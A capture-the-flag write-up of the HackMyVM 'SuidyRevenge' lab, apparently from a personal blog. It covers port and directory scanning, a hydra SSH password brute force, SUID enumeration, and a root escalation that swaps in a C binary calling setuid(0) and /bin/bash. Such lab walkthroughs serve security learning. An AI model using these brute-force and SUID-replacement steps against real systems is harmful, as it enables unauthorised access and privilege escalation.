---
layout: post
title: "HackMyVM - SuidyRevenge"
date: 2020-10-09 15:47:00 +0100
categories: hmv
---

Creator: [sml](https://hackmyvm.eu/profile/?user=sml)
Level: Hard
Release Date: 2020-10-02

## Scan

```bash
$ nmap -sV -sC -oA scans/SuidyRevenge -p- 192.168.1.65
Starting Nmap 7.93 ( https://nmap.org ) at 2020-10-09 23:08 WEST
Nmap scan report for 192.168.1.65
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9904216d81682ed7fe5eb22c1ca2f53d (RSA)
|   256 b24ec2912abaeb9cb7266908a2def2f1 (ECDSA)
|_  256 664e7852b12db69a8b562bcae548552d (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.58 seconds

```

## Enumeration

```bash
$ gobuster dir -u http://192.168.1.65 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.65
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2020/10/09 23:11:20 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 322]
===============================================================
2020/10/09 23:14:25 Finished
===============================================================
```

### Webpage Source

```bash
$ curl -s http://192.168.1.65                
Im proud to announce that "theuser" is not anymore in our servers.
Our admin "mudra" is the best admin of the world.
-suidy

<!--

"mudra" is not the best admin, IM IN!!!!
He only changed my password to a different but I had time
to put 2 backdoors (.php) from my KALI into /supersecure to keep the access!

-theuser

-->
```

## Cracking User SSH

```bash
$ hydra -l theuser -P /usr/share/wordlists/rockyou.txt 192.168.1.65 ssh 
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-09 23:16:43
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.1.65:22/
[STATUS] 145.00 tries/min, 145 tries in 00:01h, 14344255 to do in 1648:46h, 15 active
[22][ssh] host: 192.168.1.65   login: theuser   password: d***e***t
1 of 1 target successfully completed, 1 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-09 23:18:54
```

## SSH

```bash
$ ssh theuser@192.168.1.65
Linux suidyrevenge 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
Last login: Fri Oct  9 09:19:02 2020 from 192.168.1.58

theuser@suidyrevenge:~$ ls -la
total 32
drwxrwx--- 3 theuser theuser 4096 Oct  2  2020 .
drwxr-xr-x 8 root    root    4096 Oct  1  2020 ..
-rw------- 1 theuser theuser   33 Oct  2  2020 .bash_history
-rwxrwx--- 1 theuser theuser  220 Oct  1  2020 .bash_logout
-rwxrwx--- 1 theuser theuser 3526 Oct  1  2020 .bashrc
drwxr-xr-x 3 theuser theuser 4096 Oct  1  2020 .local
-rwxrwx--- 1 theuser theuser  807 Oct  1  2020 .profile
-rw-r----- 1 theuser theuser 1961 Oct  2  2020 user.txt
theuser@suidyrevenge:~$ 
```

## Find SUID Files

```
$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

```bash
-rwsrws--- 1 root theuser 16712 Oct  2  2020 /home/suidy/suidyyyyy
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 157192 Feb  2  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-sr-x 1 root violent 16608 Oct  1  2020 /usr/bin/violent
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
suidy@suidyrevenge:/home/suidy$ 
```

```bash
theuser@suidyrevenge:~$ ls ../
murda  ruin  suidy  theuser  violent  yo

theuser@suidyrevenge:~$ ls ../suidy/
note.txt  suidyyyyy

theuser@suidyrevenge:~$ cd ../suidy/

theuser@suidyrevenge:/home/suidy$ ls -la
total 52
drwxrwxr-x 3 suidy suidy    4096 Oct  2  2020 .
drwxr-xr-x 8 root  root     4096 Oct  1  2020 ..
-rw------- 1 suidy suidy      25 Oct  1  2020 .bash_history
-rwxrwx--- 1 suidy suidy     220 Oct  1  2020 .bash_logout
-rwxrwx--- 1 suidy suidy    3526 Oct  1  2020 .bashrc
drwxr-xr-x 3 suidy suidy    4096 Oct  1  2020 .local
-rw-r----- 1 suidy suidy     262 Oct  1  2020 note.txt
-rwxrwx--- 1 suidy suidy     807 Oct  1  2020 .profile
-rwsrws--- 1 root  theuser 16712 Oct  2  2020 suidyyyyy
theuser@suidyrevenge:/home/suidy$ ./suidyyyyy 

suidy@suidyrevenge:/home/suidy$ cat note.txt 
I know that theuser is not here anymore but suidyyyyy is now more secure!
root runs the script as in the past that always gives SUID to suidyyyyy binary
but this time also check the size of the file.
WE DONT WANT MORE "theuser" HERE!.
WE ARE SECURE NOW.

-suidy
suidy@suidyrevenge:/home/suidy$ 
```

## ROOT - Reverse Shell SUID

* File exchange

```c
int main(void) {
        setuid(0);
        system("/bin/bash");
}
```

```bash
suidy@suidyrevenge:/tmp$ gcc suidyyyyy.c -o suidyyyyy
suidyyyyy.c: In function ‘main’:
suidyyyyy.c:2:2: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
  setuid(0);
  ^~~~~~
suidyyyyy.c:3:2: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
  system("/bin/bash");
  ^~~~~~

suidy@suidyrevenge:/home/suidy$ mv /tmp/suidyyyyy .

suidy@suidyrevenge:/home/suidy$ chmod 4755 suidyyyyy

suidy@suidyrevenge:/home/suidy$ ./suidyyyyy 
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy 
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy
root@suidyrevenge:/home/suidy# id
uid=0(root) gid=1004(theuser) groups=1004(theuser)
root@suidyrevenge:/home/suidy# 
```
